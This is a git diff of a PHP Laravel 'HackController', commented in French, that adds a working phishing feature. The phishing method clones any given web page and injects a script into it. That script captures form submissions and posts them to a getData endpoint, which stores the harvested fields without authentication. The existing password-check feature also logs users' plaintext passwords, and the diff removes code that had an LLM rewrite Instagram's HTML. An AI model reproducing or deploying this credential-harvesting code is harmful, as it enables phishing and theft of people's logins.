@@ -14,6 +14,7 @@ use GuzzleHttp\Exception\RequestException;
 use Symfony\Component\HttpKernel\Exception\HttpException;
 use Faker\Factory as Faker;
 use App\Http\Controllers\Controller;
+use SerpApi\GoogleSearch;
 
 
 class HackController extends Controller
@@ -144,12 +145,11 @@ class HackController extends Controller
             return false;
         }
     }
-    
+
     public function checkPassword(Request $request)
     {
         // Vérifier que l'utilisateur est authentifié
         $user = Auth::user();
-
         if (!$user) {
             return response()->json(['error' => 'Utilisateur non authentifié'], 401);
         }
@@ -159,88 +159,36 @@ class HackController extends Controller
             'password' => 'required|string',
         ]);
 
+            
         // Récupérer le mot de passe depuis la requête
         $password = $request->password;
-
         // URL du fichier texte brut sur GitHub
         $url = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt';
-
         try {
             // Récupérer le contenu du fichier
             $response = Http::get($url);
-
             if ($response->failed()) {
                 return response()->json(['error' => 'Erreur lors de la récupération du fichier'], 500);
             }
-
             // Contenu du fichier texte
             $fileContent = $response->body();
-
             // Découper le contenu du fichier en un tableau de mots (chaque mot sur une ligne)
             $passwordsList = explode("\n", $fileContent);
-
             // Vérifier si le mot de passe existe dans la liste
             $isPasswordInList = in_array(trim($password), array_map('trim', $passwordsList));
-
             Log::create([
                 'utilisateur_id' => $user->id,  // ID de l'utilisateur connecté
                 'fonctionnalite_id' => 7,       // ID de la fonctionnalité (connexion)
                 'description_action' => "password checking sur le pwd :".$request->password
             ]);
-
             // Retourner une réponse JSON avec 'true' ou 'false'
             return response()->json(['exists' => $isPasswordInList]);
-
         } catch (\Exception $e) {
             // Gérer les erreurs inattendues
             return response()->json(['error' => 'Erreur inattendue: ' . $e->getMessage()], 500);
         }
     }
-
-    public function modifyHtml()
-    {
-        // URL de la page à récupérer
-        $url = 'https://www.instagram.com'; // Mettez l'URL désirée ici
-
-        // Créez un client Guzzle
-        $client = new Client();
-
-        // Étape 1 : Récupérer le HTML de la page
-        try {
-            $response = $client->request('GET', $url);
-            $html = $response->getBody()->getContents();
-        } catch (\Exception $e) {
-            return response()->json(['error' => 'Erreur lors de la récupération de la page'], 500);
-        }
-
-        // Étape 2 : Modifier le HTML avec l'API de ChatGPT
-        $chatGptApiKey = env('CHATGPT_API_KEY'); // Assurez-vous d'avoir cette clé dans votre fichier .env
-
-        $client = new Client();
-
-        try {
-            $response = $client->post('https://api.openai.com/v1/chat/completions', [
-                'headers' => [
-                    'Authorization' => 'Bearer ' . $chatGptApiKey,
-                    'Content-Type' => 'application/json',
-                ],
-                'json' => [
-                    'model' => 'gpt-3.5-turbo', // Vous pouvez changer le modèle si nécessaire
-                    'messages' => [
-                        ['role' => 'user', 'content' => "Voici le HTML de la page Instagram : $html. Modifie-le selon mes spécifications."],
-                    ],
-                ],
-            ]);
-
-            $result = json_decode($response->getBody(), true);
-            $modifiedHtml = $result['choices'][0]['message']['content'] ?? 'Aucun contenu modifié';
-        } catch (\Exception $e) {
-            return response()->json(['error' => 'Erreur lors de l\'appel à l\'API ChatGPT'], 500);
-        }
-
-        // Étape 3 : Retourner le HTML modifié
-        return response()->json(['modified_html' => $modifiedHtml]);
-    }
+    
 
     public function generatePassword()
     {
@@ -394,4 +342,188 @@ class HackController extends Controller
         // Retourner la réponse JSON
         return response()->json($fakeIdentity);
     }
+
+    public function phishing(Request $request)
+    {
+        // Vérifier que l'utilisateur est authentifié
+        $user = Auth::user();
+    
+        if (!$user) {
+            return response()->json(['error' => 'Utilisateur non authentifié'], 401);
+        }
+    
+        // Valider que l'adresse est fournie et qu'elle est une URL valide
+        $request->validate([
+            'adresse' => 'required|url',
+        ]);
+    
+        // Récupérer l'adresse depuis la requête
+        $url = $request->adresse;
+    
+        try {
+            // Effectuer une requête GET vers l'adresse donnée
+            $response = Http::get($url);
+    
+            if ($response->failed()) {
+                return response()->json(['error' => 'Impossible de récupérer le contenu de la page'], 500);
+            }
+    
+            // Récupérer le contenu HTML de la page
+            $htmlContent = $response->body();
+    
+            // Loguer l'action
+            Log::create([
+                'utilisateur_id' => $user->id,  // ID de l'utilisateur connecté
+                'fonctionnalite_id' => 12,      // ID de la fonctionnalité (récupération HTML)
+                'description_action' => "phishing pour le site : $url",
+            ]);
+    
+            // Vérifier et attribuer un ID au formulaire si nécessaire
+            $matches = [];
+            preg_match('/<form([^>]*)(id="([^"]+)")?([^>]*)>/', $htmlContent, $matches);
+    
+            if (empty($matches[2])) {
+                // Si aucun id n'est trouvé, générer un ID
+                $htmlContent = preg_replace('/<form([^>]*)>/', '<form id="form-1"$1>', $htmlContent, 1);
+                $formId = 'form-1'; // Utiliser l'ID généré
+            } else {
+                // Si un id est trouvé, l'extraire
+                $formId = $matches[3];
+            }
+    
+            // Script JS à injecter
+            $script = <<<SCRIPT
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const form = document.getElementById("$formId");
+            if (form) {
+                form.addEventListener("submit", function (event) {
+                    // Empêche le rechargement de la page
+                    event.preventDefault();
+    
+                    // Créez un objet FormData pour récupérer les données du formulaire
+                    const formData = new FormData(event.target);
+    
+                    const formDataObj = {};
+
+                    formData.forEach((value, key) => {
+                        formDataObj[key] = value;
+                    });
+
+                    fetch('http://127.0.0.1:8000/api/getData', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({data: formDataObj}) // Envoi de l'objet formData en tant que JSON
+                    })
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error('Erreur lors de la requête API');
+                        }
+                        return response.json();
+                    })
+                    .then(data => {
+                        console.log('Réponse de l\'API:', data);
+                    })
+                    .catch((error) => {
+                        console.error('Erreur lors de l\'envoi des données:', error);
+                    });
+
+                });
+
+            }
+        });
+    </script>
+    SCRIPT;
+    
+            // Injecter le script avant </body>
+            if (strpos($htmlContent, '</body>') !== false) {
+                $htmlContent = str_replace('</body>', $script . '</body>', $htmlContent);
+            }
+    
+            // Formater le HTML (optionnel)
+            if (extension_loaded('tidy')) {
+                $tidy = new \tidy();
+                $config = [
+                    'indent' => true,
+                    'output-html' => true,
+                    'wrap' => 200,
+                ];
+                $htmlContent = $tidy->repairString($htmlContent, $config, 'utf8');
+            }
+    
+            // Retourner le HTML modifié
+            return response($htmlContent)->header('Content-Type', 'text/html');
+        } catch (\Exception $e) {
+            // Gérer les erreurs inattendues
+            return response()->json(['error' => 'Erreur inattendue: ' . $e->getMessage()], 500);
+        }
+    }
+    
+    public function getData(Request $request)
+    {
+        // Vérifier que l'utilisateur est authentifié
+        // $user = Auth::user();
+
+        // if (!$user) {
+        //     return response()->json(['error' => 'Utilisateur non authentifié'], 401);
+        // }
+
+        // Valider les données envoyées (en fonction des champs que vous attendez dans le formulaire)
+        $request->validate([
+            'data' => 'required|array', // Assurez-vous que les données sont bien un tableau
+        ]);
+
+        try {
+            // Enregistrer les données dans la table des logs
+            Log::create([
+                'utilisateur_id' => null, // L'ID de l'utilisateur
+                'fonctionnalite_id' => 13,      // ID de la fonctionnalité associée (à personnaliser selon votre logique)
+                'description_action' => 'Enregistrement de données : ' . json_encode($request->data), // Enregistrer les données sous forme de texte
+            ]); 
+
+            // Retourner une réponse JSON confirmant l'enregistrement
+            return response()->json(['success' => 'Données enregistrées avec succès'], 200);
+        } catch (\Exception $e) {
+            // Gérer les erreurs
+            return response()->json(['error' => 'Erreur lors de l\'enregistrement des données : ' . $e->getMessage()], 500);
+        }
+    }
+
+
+    public function crawlerInformation(Request $request)
+    {
+
+        $user = Auth::user();
+
+        if (!$user) {
+            return response()->json(['error' => 'Utilisateur non authentifié'], 401);
+        }
+
+        $apiKey = env('SERP_API_KEY'); // Récupérer la clé API
+
+        $client = new Client(); // Créer un client HTTP
+    
+        $url = "https://serpapi.com/search";
+
+        try {
+            $response = $client->get($url, [
+                'query' => [
+                    'q' => $request->search,         // La requête de recherche
+                    'api_key' => $apiKey   // Clé API
+                ]
+            ]);
+    
+            // Récupérer et décoder la réponse JSON
+            $result = json_decode($response->getBody(), true);
+
+            return $result;
+    
+        } catch (\Exception $e) {
+            // Gestion des erreurs
+            return ['error' => $e->getMessage()];
+        }
+    }
+    
 }
